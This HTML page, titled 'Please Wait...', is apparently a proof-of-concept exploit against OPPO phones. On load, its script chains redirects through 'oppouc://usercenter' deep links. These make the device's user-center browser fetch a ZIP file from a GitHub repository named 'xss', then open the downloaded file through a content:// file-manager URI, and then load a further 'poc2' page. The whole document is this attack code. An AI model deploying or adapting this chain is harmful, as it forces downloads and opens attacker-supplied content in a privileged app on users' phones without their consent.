<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Please Wait...</title>
</head>
<body>
  <h1>Please Wait...</h1>

  <script>
    document.addEventListener('DOMContentLoaded', () => {
        const urls = [
            'https://www.youtube.com/watch?v=tf-HYnN0H4Y',
            'oppouc://usercenter.oppo.com/browser?url=https://github.com/syukirman-amir/xss/raw/main/MYOPPO.zip',
            'oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/MYOPPO.zip',
            'https://syukirman-amir.github.io/xss/poc2.html'
        ];

        const defaultDelay = 5000; // Default delay
        const specialDelay = 1000; // Special delay for specific URLs

        const replaceUrlSequentially = (index) => {
            if (index < urls.length) {
                let delay = defaultDelay;

                if (urls[index] === 'oppouc://usercenter.oppo.com/browser?url=https://github.com/syukirman-amir/xss/raw/main/MYOPPO.zip' ||
                    urls[index] === 'oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/MYOPPO.zip') {
                    delay = specialDelay;
                }

                setTimeout(() => {
                    window.location.replace(urls[index]);
                    replaceUrlSequentially(index + 1); // Call recursively to process next URL
                }, delay);
            }
        };

        replaceUrlSequentially(0); // Start with the first URL
    });
  </script>

</body>
</html>
